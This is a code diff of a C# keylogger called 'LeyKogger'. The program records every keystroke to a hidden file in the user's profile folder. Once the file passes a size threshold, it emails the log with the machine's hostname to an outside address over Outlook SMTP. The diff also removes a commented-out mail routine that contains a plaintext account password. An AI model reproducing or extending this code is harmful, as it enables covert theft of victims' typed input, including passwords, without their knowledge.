@@ -17,7 +17,6 @@ namespace LeyKogger
         private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
         private static List<Keys> keys = new();
         private static string buffer = "";
-        private static bool mailSend = false;
         private static bool shift;
         private static bool caps;
 
@@ -25,10 +24,8 @@ namespace LeyKogger
         {
             if (!File.Exists(path))
                 File.Create(path);
-            File.SetAttributes(path, FileAttributes.Hidden);
-            /*if (!File.Exists(path + ".archive"))
+            if (!File.Exists(path + ".archive"))
                 File.Create(path + ".archive");
-            File.SetAttributes(path + ".archive", FileAttributes.Hidden);*/
         }
 
         private static void ReadKeyboard()
@@ -72,77 +69,10 @@ namespace LeyKogger
                 return 0;
             }
         }
-        private static bool IsAccessable(string path)
-        {
-            try
-            {
-                File.Open(path, FileMode.Open);
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
-        }
-
-        /*private static async Task<int> BytesCount(string path)
-        {
-            return await (File.ReadAllBytes(path)).Length;
-        }*/
-
-        /*static async Task Main()
-        {
-            Initiate();
-            //Thread.Sleep(100);            
-
-            while (true)
-            {
-                ReadKeyboard();
-
-                foreach (Keys key in keys)
-                {
-                    if (key == Keys.Space) { buffer += " "; continue; }
-                    if (key == Keys.Enter) { buffer += "¶"; continue; }
-                    if (key == Keys.LButton || key == Keys.RButton || key == Keys.MButton) continue;
-
-                    buffer += key.ToString();
-                }
-
-                if (buffer.Length > 0)
-                    if (await AppendText())
-                    {
-                        await AppendText();
-                        //File.AppendAllText(path, buffer);
-                        buffer = "";
-                        keys.Clear();
-                        //byteCount = BytesCount(path);
-                        while (await BytesCount() > 2 * 1024) //2KB
-                        {
-                            buffer += SendMailAsync();
-                            try
-                            {
-                                File.AppendAllText(path + ".archive", File.ReadAllText(path));
-                                File.Delete(path);
-                                File.Create(path);
-                                File.SetAttributes(path, FileAttributes.Hidden);
-                                Thread.Sleep(100);
-                            }
-                            catch (Exception ex)
-                            {
-                                buffer += ex.Message;
-                                break;
-                            }
-
-                        }
-                    }
-                Thread.Sleep(100);
-            }
-        }*/
 
         static async Task Main()
         {
-            Initiate();
-            //Thread.Sleep(100);            
+            Initiate();          
 
             while (true)
             {                
@@ -162,13 +92,14 @@ namespace LeyKogger
                     {
                         buffer = "";
                         keys.Clear();
-                        if (await BytesCount() > 2 * 1024) //2KB
+                        if (await BytesCount() > 1 * 1024) //256KB
                         {
                             await SendMailAsync();
-                            await WriteText(); //FIRST COPY ATTACHMENT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-                            /*while (IsAccessable(path + ".archive") == false) { }
-                            await File.AppendAllTextAsync(path+".archive", await ReadText());*/
-                            //while (IsAccessable(path) == false) { }
+                            if (File.Exists(path + ".archive"))
+                                File.SetAttributes(path + ".archive", FileAttributes.Normal);
+                            await File.AppendAllTextAsync(path + ".archive", path);
+                            File.SetAttributes(path, FileAttributes.Normal);
+                            await File.WriteAllTextAsync(path, buffer);
                         }
                     }
                 Thread.Sleep(100);
@@ -176,10 +107,13 @@ namespace LeyKogger
         }
 
         private static async Task SendMailAsync()
-        {            
+        {
+            if (File.Exists(path + ".att"))
+                File.SetAttributes(path + ".att", FileAttributes.Normal);
+            File.Copy(path, path + ".att", true);
             MailMessage message = new MailMessage("leykogger@outlook.com", "mbarycki@uni.opole.pl");
             message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
-            message.Attachments.Add(new Attachment(path));
+            message.Attachments.Add(new Attachment(path + ".att"));
             using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
             {
                 client.EnableSsl = true;
@@ -189,31 +123,5 @@ namespace LeyKogger
                 await client.SendMailAsync(message);
             }
         }
-
-        /*private static Task SendMail(string filePath)
-        {
-            string info = string.Empty;
-            MailMessage message = new MailMessage("leykogger@outlook.com", "mbarycki@uni.opole.pl");
-            message.Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName();
-            message.Attachments.Add(new Attachment(filePath));
-            using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
-            {
-                client.EnableSsl = true;
-                client.Port = 587;
-                client.Timeout = 5000;
-                client.Credentials = new NetworkCredential("leykogger@outlook.com", "Key-Logger");
-                client.SendMailAsync(message);
-                
-                try
-                {
-                    client.SendAsync(message, true);
-                }
-                catch (Exception ex)
-                {
-                    info = ex.Message;
-                }                
-            }
-            return info;
-        }*/
     }
 }
